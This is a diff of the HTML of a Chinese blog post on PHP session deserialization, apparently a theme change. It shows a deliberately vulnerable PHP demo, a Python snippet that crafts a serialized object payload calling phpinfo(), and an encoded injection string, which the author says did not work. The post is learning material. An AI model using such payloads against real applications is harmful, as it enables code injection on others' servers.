-<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>首先利用我们之前写的Demo看看这个引擎是怎么储存类的</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baos:44:&quot;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baos:44:&quot;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;;</span><br></pre></td></tr></table></figure>
 
 <p>那么这里有个不可视字符并且我们是需要去自己写类似的字符串，并且算出字符个数</p>
 <p>这个写个EXP</p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(quote(<span class="built_in">chr</span>(<span class="number">4</span>))+<span class="string">&#x27;tests:44:&quot;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(quote(<span class="built_in">chr</span>(<span class="number">4</span>))+<span class="string">&#x27;tests:44:&quot;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>但是这样子并没有打通</p>
 <p>后面进行类比了一下</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%04testO:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%04testO:4:&quot;Test&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>也还是不行，这个洞不懂，如果有师傅知道，可以一起讨论一下</p>
 <h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>终于把session反序列化搞的有点东西了，虽然中途Demo3抓包由于是本地不好抓，但是最后抓到一次就行了，这周的第一次学习吧，前面都在忙行政的事，中秋节好好利用一下，最后那个思考说实话超出我能力范围了，网上也没有参考，不知道有没有这种利用方式</p>
 
-		</div>
+  </div>
+</article>
 
-		
-		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-			<div class="article-copyright-info-container">
-    <ul>
-        <li><strong>Title:</strong> 浅谈session反序列化</li>
-        <li><strong>Author:</strong> baozongwi</li>
-        <li><strong>Created at
-                :</strong> 2024-09-11 16:15:57</li>
-        
-            <li>
-                <strong>Updated at
-                    :</strong> 2024-10-21 15:56:00
-            </li>
-        
-        <li>
-            <strong>Link:</strong> https://baozongwi.xyz/2024/09/11/浅谈session反序列化/
-        </li>
-        <li>
-            <strong>
-                License:
-            </strong>
-            
 
-            
-                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
-            
-        </li>
-    </ul>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-question"><span class="toc-number">2.</span> <span class="toc-text">0x02 question</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text">概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session-%E6%9C%AC%E8%BA%AB%E6%9C%BA%E5%88%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">session 本身机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E5%95%A5%E8%A6%81%E7%94%A8session"><span class="toc-number">2.1.2.</span> <span class="toc-text">为啥要用session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E7%9A%84%E4%BA%A7%E7%94%9F%E5%92%8C%E5%82%A8%E5%AD%98"><span class="toc-number">2.1.3.</span> <span class="toc-text">session的产生和储存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.2.</span> <span class="toc-text">session反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">2.3.</span> <span class="toc-text">Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">Demo 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-2"><span class="toc-number">2.3.2.</span> <span class="toc-text">Demo 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-3"><span class="toc-number">2.3.3.</span> <span class="toc-text">Demo 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%8D%E6%80%9D%E8%80%83"><span class="toc-number">2.4.</span> <span class="toc-text">再思考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">0x03 小结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=浅谈session反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=浅谈session反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=浅谈session反序列化&body=Check out this article: https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=浅谈session反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=浅谈session反序列化&description=session反序列化的奥妙"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://baozongwi.xyz/2024/09/11/%E6%B5%85%E8%B0%88session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=浅谈session反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
 </div>
 
-		</div>
-		
+        
+        <footer id="footer">
+  <style>
+    .footer-content {
+      line-height: 24px;
+      text-align: center;
+      margin-top: 10px;
+    }
+  </style>
 
-		
-		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-			
-			<li class="tag-item mx-0.5">
-				<a href="/tags/session/">#session</a>&nbsp;
-			</li>
-			
-			<li class="tag-item mx-0.5">
-				<a href="/tags/%E5%A7%BF%E5%8A%BF/">#姿势</a>&nbsp;
-			</li>
-			
-		</ul>
-		
-
-		
-  <div class="recommended-article px-2 sm:px-6 md:px-8">
-   <div class="recommended-desktop">
-    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
-     <i aria-hidden="true"></i><span>推荐阅读</span>
-    </div>
-    <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/09/07/php反序列化-pop/" title="php反序列化\pop" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="php反序列化\pop" class="!max-w-none">
-  <span class="title">php反序列化\pop</span>
-</a><a class="recommended-article-item" href="/2024/10/08/ctfshow代码审计/" title="ctfshow代码审计" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="ctfshow代码审计" class="!max-w-none">
-  <span class="title">ctfshow代码审计</span>
-</a><a class="recommended-article-item" href="/2024/09/27/session文件包含/" title="session文件包含" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="session文件包含" class="!max-w-none">
-  <span class="title">session文件包含</span>
-</a></div>
-   </div>
-   <div class="recommended-mobile">
-   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
-     <i aria-hidden="true"></i><span>推荐阅读</span>
-   </div>
-   <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/09/07/php反序列化-pop/" title="php反序列化\pop" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="php反序列化\pop" class="!max-w-none">
-  <span class="title">php反序列化\pop</span>
-</a><a class="recommended-article-item" href="/2024/10/08/ctfshow代码审计/" title="ctfshow代码审计" rel="bookmark">
-  <img src="/images/wallhaven-6drlmx.jpg" alt="ctfshow代码审计" class="!max-w-none">
-  <span class="title">ctfshow代码审计</span>
-</a></div>
-   </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    baozongwi
   </div>
 
-		
-		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2024/09/14/php-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">php GC回收机制以及常见利用利用方式</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
-			
-			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2024/09/09/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E4%BA%AC%E6%B4%A5%E5%86%80/">
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item">长城杯2024京津冀</span>
-						<span class="post-nav-item">Next posts</span>
-					</span>
-					<span class="right arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-right"></i>
-					</span>
-				</a>
-			</div>
-			
-		</div>
-		
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
 
+  <!-- 添加友情链接 -->
+  <div class="friend-links footer-content">
+    <a href="https://www.dkdun.cn/login" target="_blank" style="margin-right: 15px;">DKdun</a>
+    <a href="https://ctf.show/" target="_blank">CTFSHOW</a>
+  </div>
 
-		
-		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-			<div class="comments-container mt-10 w-full ">
-    <div id="comment-anchor" class="w-full h-2.5"></div>
-    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
-        Comments
-    </div>
-    
+  <!-- 添加ICP备案信息 -->
+  <div class="icp-info footer-content">
+    <a href="https://beian.miit.gov.cn/" target="_blank" style="color: #888; text-decoration: none;">蜀ICP备2024111128号</a>
+  </div>
 
-        
-            
-    <div id="waline"></div>
-    <script type="module" data-swup-reload-script>
-      import { init } from '/js/libs/waline.mjs';
-
-      function loadWaline() {
-        init({
-          el: '#waline',
-          serverURL: 'https://comment.baozongwi.xyz',
-          lang: 'zh-CN',
-          dark: 'body[class~="dark-mode"]',
-          reaction: false,
-          requiredMeta: ['nick', 'mail'],
-          emoji: ['https://unpkg.com/@waline/emojis@1.2.0/tw-emoji'],
-          
-          
-        });
-      }
-
-      if (typeof swup !== 'undefined') {
-        loadWaline();
-      } else {
-        window.addEventListener('DOMContentLoaded', loadWaline);
-      }
-    </script>
-
-
-
-        
-    
-</div>
-
-		</div>
-		
-	</div>
-
-	
-	<div class="toc-content-container">
-		<div class="post-toc-wrap">
-	<div class="post-toc">
-		<div class="toc-title">On this page</div>
-		<div class="page-title">浅谈session反序列化</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-question"><span class="nav-text">0x02 question</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-text">概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#session-%E6%9C%AC%E8%BA%AB%E6%9C%BA%E5%88%B6"><span class="nav-text">session 本身机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E5%95%A5%E8%A6%81%E7%94%A8session"><span class="nav-text">为啥要用session</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E7%9A%84%E4%BA%A7%E7%94%9F%E5%92%8C%E5%82%A8%E5%AD%98"><span class="nav-text">session的产生和储存</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">session反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Demo"><span class="nav-text">Demo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Demo-1"><span class="nav-text">Demo 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Demo-2"><span class="nav-text">Demo 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Demo-3"><span class="nav-text">Demo 3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%8D%E6%80%9D%E8%80%83"><span class="nav-text">再思考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x03 小结</span></a></li></ol>
-
-	</div>
-</div>
-	</div>
-	
-</div>
-			</div>
-
-			
-		</div>
-
-		<div class="main-content-footer">
-			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
-    <div class="info-container py-3 text-center">
-        
-        <div class="text-center">
-            &copy;
-            
-              <span>2024</span>
-              -
-            
-            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">baozongwi</a>
-            
-                
-                <p class="post-count space-x-0.5">
-                    <span>
-                        129 posts in total
-                    </span>
-                    
-                        <span>
-                            310.3k words in total
-                        </span>
-                    
-                </p>
-            
-        </div>
-        
-            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
-            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
-                
-                    <span id="busuanzi_container_site_uv" class="lg:!block">
-                        <span class="text-sm">VISITOR COUNT</span>
-                        <span id="busuanzi_value_site_uv"></span>
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv" class="lg:!block">
-                        <span class="text-sm">TOTAL PAGE VIEWS</span>
-                        <span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
-            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
-            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
-        </div>
-        
-            <div class="icp-info my-1"><a target="_blank" rel="nofollow" href="
-                
-                https://beian.miit.gov.cn
-                
-                ">蜀ICP备2024111128号</a></div>
-        
-        
-            <div>
-                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
-            </div>
-        
-        
-            <script data-swup-reload-script>
-                try {
-                    function odometer_init() {
-                    const elements = document.querySelectorAll('.odometer');
-                    elements.forEach(el => {
-                        new Odometer({
-                            el,
-                            format: '( ddd).dd',
-                            duration: 200
-                        });
-                    });
-                    }
-                    odometer_init();
-                } catch (error) {}
-            </script>
-        
-        
-        
-    </div>  
+  <!-- 添加站点统计信息 -->
+  <div class="footer-content">
+    <span id="busuanzi_container_site_pv">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次 |
+    </span>
+    <span id="busuanzi_container_site_uv">
+      访客数 <span id="busuanzi_value_site_uv"></span> 人次
+    </span>
+  </div>
 </footer>
-		</div>
-	</div>
 
-	
-	<div class="post-tools">
-		<div class="post-tools-container">
-	<ul class="article-tools-list">
-		<!-- TOC aside toggle -->
-		
-		<li class="right-bottom-tools page-aside-toggle">
-			<i class="fa-regular fa-outdent"></i>
-		</li>
-		
+<!-- 在文件末尾添加不蒜子脚本 -->
+<script async src="//busuanzi.ibruce.org/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-		<!-- go comment -->
-		
-		<li class="go-comment">
-			<i class="fa-regular fa-comments"></i>
-		</li>
-		
-	</ul>
-</div>
-	</div>
-	
-
-	<div class="right-side-tools-container">
-		<div class="side-tools-container">
-	<ul class="hidden-tools-list">
-		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-			<i class="fa-regular fa-magnifying-glass-plus"></i>
-		</li>
-
-		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-			<i class="fa-regular fa-magnifying-glass-minus"></i>
-		</li>
-
-		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-			<i class="fa-regular fa-moon"></i>
-		</li>
-
-		<!-- rss -->
-		
-		<li class="right-bottom-tools rss flex justify-center items-center">
-			<a class="flex justify-center items-center" href="/atom.xml" target="_blank">
-				<i class="fa-regular fa-rss"></i>
-			</a>
-		</li>
-		
-
-		
-
-		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-			<i class="fa-regular fa-arrow-down"></i>
-		</li>
-	</ul>
-
-	<ul class="visible-tools-list">
-		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-			<i class="fa-regular fa-cog fa-spin"></i>
-		</li>
-		
-		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-			<i class="arrow-up fas fa-arrow-up"></i>
-			<span class="percent"></span>
-		</li>
-		
-		
-	</ul>
-</div>
-	</div>
-
-	<div class="image-viewer-container">
-	<img src="">
-</div>
-
-	
-	<div class="search-pop-overlay">
-	<div class="popup search-popup">
-		<div class="search-header">
-			<span class="search-input-field-pre">
-				<i class="fa-solid fa-keyboard"></i>
-			</span>
-			<div class="search-input-container">
-				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
-			</div>
-			<span class="popup-btn-close">
-				<i class="fa-solid fa-times"></i>
-			</span>
-		</div>
-		<div id="search-result">
-			<div id="no-result">
-				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
-			</div>
-		</div>
-	</div>
-</div>
-	
-
-</main>
+    </div>
+    <!-- styles -->
 
 
-<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
-<script>
-    const swup = new Swup({
-        plugins: [
-            new SwupScriptsPlugin({
-                optin: true,
-            }),
-            new SwupProgressPlugin(),
-            new SwupScrollPlugin({
-                offset: 80,
-            }),
-            new SwupSlideTheme({
-                mainElement: ".main-content-body",
-            }),
-            new SwupPreloadPlugin(),
-        ],
-        containers: ["#swup"],
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
     });
-</script>
+    clip.on('success', function(e) {
